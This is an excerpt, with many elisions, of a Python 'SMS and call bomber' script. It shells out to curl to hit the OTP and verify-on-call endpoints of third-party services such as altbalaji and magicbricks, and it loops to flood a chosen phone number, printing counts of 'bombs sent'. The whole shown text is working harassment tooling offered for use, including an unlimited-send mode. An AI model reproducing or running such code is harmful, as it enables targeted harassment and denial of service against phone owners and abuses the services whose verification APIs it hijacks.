...
def getapi(pn, lim, cc):
    ...
    if lim == 3:
        ...
        os.system(
            'curl -s -X POST -H "Host:api.cloud.altbalaji.com" -H "Connection:keep-alive" -H "Content-Length:' + str(
                len(con)) +
        ...
        rd = os.popen(
            'curl -s -X GET -H "Host:api.magicbricks.com" -H "Connection:keep-alive" -H "User-Agent:Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.89 Safari/537.36" -H "Save-Data:on" -H "Accept:image/webp,image/apng,image/*,*/*;q=0.8" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6" "https://api.magicbricks.com/bricks/verifyOnCall.html?mobile=' + pn + '"').read().decode(
            'utf-8')
...
def start(target, counter, delay, ch, cc):
    ...
    while success < (int(bombs)):
        ...
        print("==================================================================")
        print("     We Are Bombing On The Number, Have Patience!!               ")
        print("     Keep your data connection active during bombing !!    ")
        print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
        print("             Number  On Bombing          : +" + str(cc) + " ", target)
        print("             Number of Bombs Sent        : ", requested)
        print("             Successful Bombs            : ", success)
...
if not cc.strip() == "91":
    if type == 1:
        print(
            '\t\tSorry Call Bombing is Not Supported In Your Region!!!!')
        print()
        input('Press Enter To Exit....')
        print('\n\n')
        banner()
...
if type == 1:
    ...
    print("\n\tPlease Don't Overload Call Bomb So That It Would Work For Longer Period Of Time...")
    cbomb = True
if cbomb:
...
if nm == 0:
    ...
    while True:
        ci += 1
        l = count_inf
        print("    Total Number of Bombs Sent : ", l)
        if int(l) > maxlim:
            print('\n\n\tSorry Due To Misuse Of This Script We Only Provide ' +
                  str(maxlim) + ' SMS At Once...\n\n')
            input('Press Enter To Exit...')
